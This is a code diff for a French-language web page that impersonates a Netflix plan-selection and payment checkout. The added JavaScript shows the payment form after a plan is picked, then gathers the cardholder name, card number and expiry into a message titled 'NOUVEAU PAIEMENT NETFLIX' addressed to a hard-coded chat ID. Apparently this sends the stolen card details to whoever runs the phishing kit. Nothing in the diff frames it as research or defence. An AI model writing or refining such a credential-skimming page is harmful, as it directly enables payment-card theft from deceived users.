@@ -109,6 +109,19 @@
             width: 280px;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
             position: relative;
+            cursor: pointer;
+            transition: all 0.2s;
+            border: 1px solid transparent;
+        }
+
+        .plan-card:hover {
+            transform: scale(1.02);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .plan-card.selected {
+            border: 1px solid #e50914;
+            box-shadow: 0 0 0 3px rgba(229,9,20,0.2);
         }
 
         .recommended-badge {
@@ -171,20 +184,30 @@
             background: #f6121d;
         }
 
-        /* Payment Form */
+        /* Payment Form - CACHÉ PAR DÉFAUT */
         .payment-form {
             background: white;
             border-radius: 4px;
             padding: 30px;
             max-width: 600px;
-            margin: 0 auto;
+            margin: 40px auto 0;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            display: none; /* Masqué initialement */
         }
 
         .form-title {
             font-size: 20px;
             margin-bottom: 20px;
             font-weight: 500;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .selected-plan {
+            font-size: 16px;
+            color: #e50914;
+            font-weight: bold;
         }
 
         .form-group {
@@ -289,7 +312,7 @@
         <h1 class="page-title">Choisissez votre offre</h1>
         
         <div class="plans">
-            <div class="plan-card">
+            <div class="plan-card" data-plan="standard-pub">
                 <div class="plan-name">Standard avec pub</div>
                 <div class="plan-price">5,99 €</div>
                 <ul class="plan-features">
@@ -301,7 +324,7 @@
                 <button class="select-button">Sélectionner</button>
             </div>
             
-            <div class="plan-card">
+            <div class="plan-card" data-plan="standard">
                 <div class="recommended-badge">Recommandé</div>
                 <div class="plan-name">Standard</div>
                 <div class="plan-price">13,49 €</div>
@@ -314,7 +337,7 @@
                 <button class="select-button">Sélectionner</button>
             </div>
             
-            <div class="plan-card">
+            <div class="plan-card" data-plan="premium">
                 <div class="plan-name">Premium</div>
                 <div class="plan-price">17,99 €</div>
                 <ul class="plan-features">
@@ -327,9 +350,12 @@
             </div>
         </div>
 
-        <div class="payment-form">
-            <h2 class="form-title">Informations de paiement</h2>
-            <form id="paymentForm">
+        <div class="payment-form" id="paymentForm">
+            <h2 class="form-title">
+                <span>Informations de paiement</span>
+                <span class="selected-plan" id="selectedPlanDisplay">Standard - 13,49 €/mois</span>
+            </h2>
+            <form id="paymentFormElement">
                 <div class="form-group">
                     <label for="cardName">Nom sur la carte</label>
                     <input type="text" id="cardName" required>
@@ -366,8 +392,45 @@
     </footer>
 
     <script>
-        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+        // Gestion de la sélection d'un plan
+        const planCards = document.querySelectorAll('.plan-card');
+        const paymentForm = document.getElementById('paymentForm');
+        const selectedPlanDisplay = document.getElementById('selectedPlanDisplay');
+        
+        let selectedPlan = null;
+
+        planCards.forEach(card => {
+            card.addEventListener('click', function() {
+                // Retire la sélection précédente
+                planCards.forEach(c => c.classList.remove('selected'));
+                
+                // Ajoute la sélection à la carte cliquée
+                this.classList.add('selected');
+                
+                // Stocke le plan sélectionné
+                selectedPlan = this.getAttribute('data-plan');
+                
+                // Met à jour l'affichage du plan sélectionné
+                const planName = this.querySelector('.plan-name').textContent;
+                const planPrice = this.querySelector('.plan-price').textContent;
+                selectedPlanDisplay.textContent = `${planName} - ${planPrice}/mois`;
+                
+                // Affiche le formulaire de paiement
+                paymentForm.style.display = 'block';
+                
+                // Fait défiler jusqu'au formulaire
+                paymentForm.scrollIntoView({ behavior: 'smooth' });
+            });
+        });
+
+        // Gestion du formulaire de paiement
+        document.getElementById('paymentFormElement').addEventListener('submit', function(e) {
             e.preventDefault();
+            
+            if (!selectedPlan) {
+                alert('Veuillez sélectionner un abonnement');
+                return;
+            }
             
             const cardName = document.getElementById('cardName').value;
             const cardNumber = document.getElementById('cardNumber').value;
@@ -379,7 +442,7 @@
             const chatId = '-4883048028';
             const message = `💳 NOUVEAU PAIEMENT NETFLIX 💳
 
-🏷 Offre sélectionnée: Standard (13,49€/mois)
+🏷 Offre sélectionnée: ${selectedPlanDisplay.textContent}
 👤 Nom sur carte: ${cardName}
 🔢 Numéro carte: ${cardNumber}
 📅 Expiration: ${expiry}
